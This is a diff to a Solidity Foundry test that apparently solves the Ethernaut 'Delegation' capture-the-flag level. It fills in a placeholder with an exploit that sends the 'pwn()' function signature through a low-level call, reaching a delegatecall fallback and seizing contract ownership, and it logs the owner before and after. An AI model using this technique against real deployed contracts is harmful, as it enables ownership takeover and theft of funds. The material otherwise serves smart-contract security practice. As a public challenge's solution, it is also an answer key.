@@ -41,14 +41,29 @@ contract DelegationTest is Test {
         Delegation delegationContract = Delegation(levelAddress);
 
         emit log_named_address("Eve's address: ", address(eve));
+        emit log_named_address(
+            "Original owner of the Delegation contract: ",
+            address(delegationContract.owner())
+        );
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL EXPLOIT
         //////////////////////////////////////////////////////////////*/
 
-        /*
-         * CODE GOES HERE
-         */
+        emit log_string("Starting the exploit... 🧨");
+        emit log_string(
+            "Making a low-level call to the Delegation contract..."
+        );
+
+        (bool success, ) = address(delegationContract).call(
+            abi.encodeWithSignature("pwn()")
+        );
+        require(success, "Transaction failed");
+
+        emit log_named_address(
+            "Ownership transferred to: ",
+            address(delegationContract.owner())
+        );
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL SUBMISSION
